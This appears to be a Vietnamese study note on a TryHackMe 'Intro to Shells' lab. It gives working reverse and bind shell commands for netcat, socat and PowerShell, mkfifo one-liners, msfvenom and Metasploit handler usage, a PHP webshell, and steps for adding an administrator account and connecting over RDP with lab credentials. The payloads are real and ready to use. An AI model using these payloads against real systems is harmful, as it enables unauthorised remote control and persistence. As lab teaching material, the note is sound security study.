<h1>Shell</h1>

Về cơ bản shell là một giao diện để tương tác với CLI của OS như bash hoặc sh trong Linux, cmd.exe hoặc Powershell trong Windows\
Có 2 dạng shell cơ bản thường được sử dụng trong tấn công,\
reverse shell sử dụng để giúp hacker có quyền access đến command line\
bind shell sử dụng để mỏe port trên server mà hacker có thể kết nối tới\

<h2>Tools</h2>

Một số tool thường được sử dụng để tương tác với shell bao gồm:\
**Netcat\
Socat\
Metasploit --multi/handler\
Msfvenom**

<h2>Types of Shell</h2>

Như đã nói ở trên, 2 loại Shell chính được dùng trong tấn công là: **Reversel Shells** và **Bind Shells**\
>**Reverse Shells** được sử dụng để buộc mục tiêu phải thực hiện kết nối ngược lại về máy của kẻ tấn công. Và trên máy tấn công sẽ sử dụng các tools liệt kê ở mục 2 để lắng nghe các kết nối gọi về.
>Đây là một cách thức sử dụng để bypass firewall rule.\
>**Bind Shells** được sử dụng để mở cổng trên máy mục tiêu và kẻ tấn công sẽ kết nối tới cổng này để thực hiện các hành vi của mình.
>Điểm yếu của shell này là có thể bị tường lửa chặn.

VD về Shell:\
**Reverse Shells**\
Trên máy tấn công:
```console
sudo nc -lvnp 443
```
Trên máy mục tiêu:
```console
nc <Local_IP> <Port> -e /bin/bash
```
![image](https://user-images.githubusercontent.com/95600382/149742730-750f251d-8cbf-4d10-945e-5e84933c86e4.png)\
**Bind Shells**\
Trên máy mục tiêu:
```console
nc -lvnp <port> -e "cmd.exe"
```
Trên máy tấn công:
```console
nc MACHINE_IP <port>
```
![image](https://user-images.githubusercontent.com/95600382/149743149-7f919a1c-81e4-483c-84fe-8e687bdfadc1.png)\
Shell có 2 loại tương tác *interactive* và *non-interactive*:\
Interactive: Shell này sẽ tương tác với các chương trình có trên máy đích sau khi được thực thi. VD:\
![image](https://user-images.githubusercontent.com/95600382/149744064-e33674f7-1a82-4a36-b347-a37ac7dc8cb6.png)\
Non-Interactive: Đơn giản hơn nhưng nó sẽ khó để thực hiện khai thác hơn. VD:\
![image](https://user-images.githubusercontent.com/95600382/149744218-678e2251-a0d6-4a14-b77c-e0cbd8b81b3a.png)\

<h2>Netcat</h2>

Câu lệnh sử dụng netcat để lắng nghe trên Linux:\
*Revesel Shells*
```console
nc -lvnp <port-number>
```
Trong đó:\
-l: set netcat là listener\
-v: verbose\
-n: k sử dụng DNS\
-p: port\
*Bind Shells*
```console
nc <target-ip> <chosen-port>
```
<h2>Netcat Shell Stabilisation</h2>

*C1: Sử dụng Python để tunning Shell*\
Áp dụng cho Linux vì Python gần như luôn được cài đặt mặc định. Có 3 bước để áp dụng:\
1. Sử dụng `python -c 'import pty;pty.spawn("/bin/bash")'` để import thư viện pty và chạy lệnh sau ;
2. `export TERM=xterm` cho phép sử dụng các term command như clear
3. Sử dụng Ctrl + Z để khiến shell chạy ngầm. Quay trở lại giao diện sử dụng `stty raw -echo; fg` để xác thực kết nối lại vào shell
VD:\
![image](https://user-images.githubusercontent.com/95600382/149748187-9e596b74-2f8b-46dc-bbda-f4f47bf98e1e.png)\
*C2: Sử dụng rlwrap*\
Note: rlwrap không được cài đặt mặc định trên Kali. `sudo apt install rlwrap`\
Lệnh sử dụng:
```console
rlwrap nc -lvnp <port>
```
Đây là một kỹ thuật sử dụng tốt cho các Windows Shell.
*C3: Socat*\
Note: Kỹ thuật này chỉ áp dụng cho Linux. Để thực hiện kỹ thuật này trc tiên chúng ta cần up một file `socat static compiled binary` lên mục tiêu.\
Cách dễ nhất là host một server với python:\
```console
sudo python3 -m http.server 80
wget <LOCAL-IP>/socat -O /tmp/socat (hoặc curl)
```
<h2>Socat</h2>

Socat cũng khá tương tự với netcat nhưng về cơ bản thì chúng lại không giống nhau. Một cách hình dung dễ nhất về socat là nó là một connector kết nối 2 điểm với nhau.\
*Reverse Shells*\
Lệnh để lắng nghe reverse shell:
```console
socat TCP-L:<port> -
```
Lệnh sử dụng trong windows để kết nối về:
```console
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```
Tương tự với Linux:
```console
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```
*Bind Shell*\
Ở trên máy mục tiêu sẽ thực hiện lệnh:\
Linux:\
```console
socat TCP-L:<PORT> EXEC:"bash -li"
```
Windows:\
```console
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```
Trên máy tấn công sẽ thực hiện lệnh để kết nối tới shell:\
```console
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```
Và Socat có thể tạo một kết nối ổn định tới Linux tty Reverse Shell. Lệnh sau sẽ được thực hiện trên máy mục tiêu:\
```console
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
Trong lệnh trên, ta đang kết nối 2 điểm với nhau port và file. điều này cũng tương tự như sử dụng `Ctrl + Z` và `stty raw -echo; fg` để tạo một kết nối vào tty đầy đủ.\
Việc thực hiện ổn định kết nối với socat này cần phải được kích hoạt với một số lệnh socat trên máy mục tiêu. Thông thường socat không phải là một dịch vụ mặc định nhưng cta vẫn có thể upload một số `precompiled socat binary` để chạy các lệnh socat bình thường.\
Một kịch bản tấn công thường thấy sẽ là, Chạy non-interactive netcat shell trên máy mục tiêu và sử dụng các lệnh socat đặc biệt để chuyển thành interactive shell mà có thể kết nối bằng socat\
Lệnh:\
```console
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
EXEC:"bash -li" để tạo một phiên bash\
pty, allocates a pseudoterminal on the target -- part of the stabilisation process\
stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)\
sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell\
setsid, creates the process in a new session\
sane, stabilises the terminal, attempting to "normalise" it.\
![image](https://user-images.githubusercontent.com/95600382/149865352-104db586-5005-44a8-9c88-430abac863cd.png)

<h2>Socat Encryted Shells</h2>

Một trong các chức năng hay của socat là khả năng tạo một encrypted shell (cả 2 loại), thường được sử dụng để   bypass IDS.\
Để tạo một encrypted shell, ta sẽ sử dụng `OPENSSL` thay thế cho `TCP`\
Đầu tiên, ta cần tạo một cert để sử dụng cho encrypted shell:\
```console
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
Lệnh trên sẽ tạo ra một cert với 2048 bit RSA key, self-signed và có hạn 362 ngày. Khi chạy thì sẽ hoàn thiện thông tin về cert, có thể để trống hoặc điền random\
![image](https://user-images.githubusercontent.com/95600382/149866093-b5fa54eb-0746-4896-a531-f3fcc23b1a6b.png)\
Tiếp đó, gộp 2 file `shell.key` và `shell.crt` vào một file `.pem`:
```console
cat shell.key shell.crt > shell.pem
```
![image](https://user-images.githubusercontent.com/95600382/149866369-16faf647-7d47-491e-9be4-17549a2a3923.png)\
Giờ hãy bật reverse shell listener:\
```console
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
```
Lệnh trên sẽ setup một `OPENSSL listener` sử dụng cert vừa tạo.\
Để kết nối về listener sử dụng lệnh:\
```console
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```
Tương tự với `bind shell`:
Target:\
```console
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```
Attacker:\
```console
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```
Lưu ý cert sẽ luôn được sử dụng bởi bên lắng nghe.
VD:\
![image](https://user-images.githubusercontent.com/95600382/149866780-12d87424-4786-418a-a70a-1985f4002de7.png)\
Note: Có thể kết hợp với task socat trước đó.\
Lệnh để setting OPENSSL-LISTENER sử dụng tty:\
```console
socat OPENSSL-LISTEN:53,cert=encrypt.pem,raw,verify=0 FILE:`tty`,raw,echo=0
```
Lệnh để kết nối ngược lại Listener trên:\
```console
socat OPENSLL:10.10.10.5:53,verify=0,EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

<h2>Common Shell Payloads</h2>

On Linux, however, we would instead use this code to create a listener for a bind shell:\
```console
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
Giải thích:\
The command first creates a named pipe at /tmp/f. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into sh, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.\
![image](https://user-images.githubusercontent.com/95600382/149868801-73216f4f-dfa5-4e99-bee6-0262b3606abd.png)\
Tương tự với reverse shell:\
```console
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
![image](https://user-images.githubusercontent.com/95600382/149869029-928ef629-2894-40a4-a7e6-32e70b9e9b85.png)\
Với mục tiêu là Windows Server, chúng ta có thể sử dụng Powershell reverse shell, VD:\
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
Lệnh trên có thể đc thực hiện thông qua bất kỳ trình thực thi câu lệnh nào trên Windows bao gồm cả web shell.\
![image](https://user-images.githubusercontent.com/95600382/149869257-58518fad-93a1-4c44-b01f-734a763989c4.png)\
Shell code:https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md\

<h2>MsfVenom</h2>

Tạo shell với MsfVenom, vd trong windows:
```console
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
```
![image](https://user-images.githubusercontent.com/95600382/150063757-ca06bc7d-045c-40b2-b0b6-9d8e63cfeeec.png)\
-f: output format\
-o: output location và file name\
LHOST: IP connect về\ 
LPORT\

2 Khái niệm staged reverse shell payload và stageless reverse shell payload.\
- Staged payload được gửi thành 2 phần. Phần đầu gọi là `stager`. Đây là phần code sẽ thực thi trực tiếp trên server, kết nối về listener nhưng lại không chứa phần code nào của reverse shell trong nó. Thay vào đó nó sẽ sử dụng kết nối về listener để thực thi payload trực tiếp mà không cần qua ổ cứng trên máy đích nhằm né anti virus.
(Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the Metasploit multi/handler, which will be covered in the next task.)\
- Stageless payload phổ biến hơn. Khi được thực thi, nó sẽ ngay lập tức gửi shell về cho listener/
(Stageless payloads tend to be easier to use and catch; however, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove. Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software. Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.)\
Quy tắc đặt tên cho Payload
Khi làm việc msfvenom:
`<OS>/<arch>/<payload>`
VD:
`linux/x86/shell_reverse_tcp`
msfvenom sẽ tạo 1 stageless reverse shell cho Linux x86\
windows 32 bits: `windows/shell_reverse_tcp`\
Windows 64 bits: `winows/x64/shell_reverse_tcp`\
Stageless payload sẽ được đánh dấu với dấu `_`. Staged payload được đánh dấu với `/`. VD windows 64 bits staged Meterpreter payload:
```
windows/x64/meterpreter/reverse_tcp
```
What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell\
```
msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443   
```
<h2>Metasploit multi/handler</h2>

Là một phần không thể thiếu khi sử dụng các staged payload và nó khá là dễ để sử dụng:\
- Mở Metasploit với `msfconsole`\
- gõ `use multi/handler` và nhấn Enter\
- gõ `options` để xem các options khả dụng:
![image](https://user-images.githubusercontent.com/95600382/150087349-30d240ca-fe21-4f94-89cd-3e336b75196f.png)\
Có 3 options mà chúng ta cần đặt: payload, LHOST, LPORT. Chúng có thể được đặt với các lệnh sau:\
```
set PAYLOAD <payload>
set LHOST <listen-address>
set LPORT <listen-port
```
Sau khi thiết lập các thông số. Ta có thể sử dụng lệnh `exploit -j` để chạy listener ngầm.
![image](https://user-images.githubusercontent.com/95600382/150089202-72aacc09-9367-46a7-833c-e3941e5efd64.png)\
Để metasploit có thể lắng nghe các port < 1024 nó cần được chạy với quyền `sudo`.\
Tạo shell:
```
msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=192.168.231.128 LPORT=443
```
Gửi shell đến máy đích thông qua một python http server và chạy shell\
Ta có thể thấy Metasploit đã nhận kết nối và gửi nốt phần còn lại của payload và tạo một reverse shell cho chúng ta:\
![image](https://user-images.githubusercontent.com/95600382/150089950-18129d9a-5cf3-4046-8b05-b97ba94fd939.png)\
Lưu ý rằng do multi/handler chạy ngầm, ta cần sử dụng `sessions 1` để truy cập vào shell.

<h2>WebShells</h2>

Đôi khi chúng ta gặp các trang web cho phép tải lên các nội dung từ máy mình trong đó có cả các tệp thực thi. Lý tưởng nhất là có thể upload code trực tiếp của reverse shell hoặc bind shell nhưng nó chỉ là lý tường.\
Webshell là một thuât ngữ để chỉ các script chạy trong một web server (thường là PHP hoặc ASP) và có thể thực thi code trên server thông qua nó. Về cơ bản, các command được nhập vào web page thông qua các form HTML hoặc trực tiếp trong các URL và sau đó được thực thi bởi script, và kết quả có thể được trả về và hiển thị ngay trên web page. Thường sử dụng để qua mặt tường lửa.\
Và PHP vẫn là ngôn ngữ phổ biến nhất dùng cho server side scripting.
Một VD đơn giản nhất về WebShell:
```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```
Nó sẽ thực thi các command có trong query GET và đứng sau tham số ?cmd= và thực hiện với .shell_exec(). pre để đảm bảo rằng các kết quả trả về đúng với format của page.\
![image](https://user-images.githubusercontent.com/95600382/150091599-4c627f3e-ea8c-442d-963c-17ccb0b17a6f.png)\

<h2>Next Steps</h2>

Vậy bước tiếp theo sau khi đã đẩy Shell và kết nối thành công và j ?
Trong Linux, ý tưởng ở đây có thể là chúng ta sẽ cố gắng gain access cho user. SSH key thường được lưu ở `/home/<user>/.ssh`. Và sau đó mở phiên SSH vào hệ thống.
Trong Windows, các lựa chọn sẽ bị giới hạn. Thông thường chỉ lý tưởng khi shell được chạy bởi SYSTEN user hoặc các user admin để có thể thực hiện tạo kết nối RDP, telnet, winexe, psexec, WinRM ,... vào hệ thống.\
syntax để tạo user và thêm vào gr admin:
```
net user <username> <password> /add
net localgroup administrators <username> /add
```
<h2>Practice and Ex</h2>

Try uploading a webshell to the Linux box, then use the command: `nc <LOCAL-IP> <PORT> -e /bin/bash` to send a reverse shell back to a waiting listener on your own machine.\
Navigate to `/usr/share/webshells/php/php-reverse-shell.php` in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.\ 
Log into the Linux machine over SSH using the credentials in task 14. Use the techniques in Task 8 to experiment with bind and reverse netcat shells.\
Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.\
Look through https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md and try some of the other reverse shell techniques. Try to analyse them and see why they work.\
Switch to the Windows VM. Try uploading and activating the php-reverse-shell. Does this work?\
Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.\
The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.\
Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.\
Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.\
Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with netcat -- does this work?\
https://tryhackme.com/room/introtoshells\

Tạo webshell đơn giản:
```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```
Tạo reverse shell với reverse shell one liner powershell:
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
Encode url và thực thi thông qua webshell:\
![image](https://user-images.githubusercontent.com/95600382/150101289-e46d5c32-0890-469e-b2f3-09db4c371fc0.png)\
Thực hiện lắng nghe với nc:
```
nc -lvnp 53
```
![image](https://user-images.githubusercontent.com/95600382/150101442-2aab6af4-fbc2-4a03-b99c-80356e28906d.png)\
Tạo user thông qua reverse shell và thêm vào gr addministrator:
```
net user hieuba hieuba /add
net localgroup administrators hieuba /add
```
![image](https://user-images.githubusercontent.com/95600382/150101775-80677558-2855-4228-b420-bc1cc623cb9f.png)\

Thực hiện RDP với user vừa tạo:
```
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.36.234 /u:hieuba /p:'hieuba'
```
![image](https://user-images.githubusercontent.com/95600382/150102422-34e74905-ae68-40dc-92a9-487ad3b83795.png)\
![image](https://user-images.githubusercontent.com/95600382/150103152-255d6e7a-7ae1-49ef-8b82-428f2ecce780.png)\

Thực hiện kỹ thuật bind shell với user admin:
```
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.36.234 /u:Administrator /p:'TryH4ckM3!'
```
![image](https://user-images.githubusercontent.com/95600382/150107586-20bf1f31-4060-48d5-8085-a7c53d086812.png)\

Thực hiện bind shell với socat
![image](https://user-images.githubusercontent.com/95600382/150108968-fbb43068-580b-462e-a9f0-45e320f7c8ab.png)\











